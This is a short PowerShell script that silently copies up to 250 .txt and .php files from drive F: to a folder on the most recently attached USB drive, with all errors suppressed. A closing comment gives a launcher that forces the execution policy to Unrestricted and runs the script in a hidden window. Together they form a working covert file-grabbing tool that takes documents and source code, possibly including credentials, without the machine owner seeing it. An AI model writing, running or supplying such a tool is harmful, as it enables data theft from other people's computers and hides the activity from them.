function getLastUsbLetter{
    return ((Get-Partition -DiskNumber ((Get-Disk).Length - 1)).DriveLetter)
}
function copyAll{
    Clear-Host
    $letter = (getLastUsbLetter)
    $files = (Get-ChildItem "F`:" -ErrorAction SilentlyContinue -Recurse -Include ('*.txt','*.php'))
    $count = 0;
    $limit = 250;
    foreach($file in $files){
        if($count -lt $limit){
            Copy-Item -Force -Path $file.FullName -Destination ("$letter`:/container") -ErrorAction SilentlyContinue
            $count++;
        }else{
            return
        }
    }
}
copyAll
#powershell -command "$l=((Get-Partition -DiskNumber ((Get-Disk).Length - 1)).DriveLetter);Set-ExecutionPolicy Unrestricted -Force ; powershell -windowstyle hidden -File \"$l`:\USBCopy_without_GUI.ps1\" ; exit"